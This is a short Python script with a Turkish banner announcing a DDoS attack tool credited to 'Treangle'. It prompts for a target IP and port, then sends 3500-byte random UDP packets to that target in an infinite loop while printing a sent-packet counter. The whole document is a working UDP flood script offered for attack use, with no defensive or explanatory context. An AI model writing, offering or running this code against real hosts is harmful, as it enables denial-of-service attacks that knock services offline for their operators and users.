import os
import socket
import random



os.system("clear")
print("-"*70)
print("          Ddos Saldırısına Hoşgeldiniz instagram = zumrudu_anka_team      ")
print("          Bu Araç Treangle Tarafından Oluşturulmuştur      ")
print("-"*70)

hedef_ip = str(input("Lütfen Hedef Ip yi Giriniz : "))
hedef_port = int(input("Lütfen Hedef Portu Giriniz : "))

bytes = random._urandom(3500)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

sayac = 0

while True:
    sock.sendto(bytes, (hedef_ip, hedef_port))

    sayac = sayac+1
    print("Treangle ddos sent : %s" %(sayac))








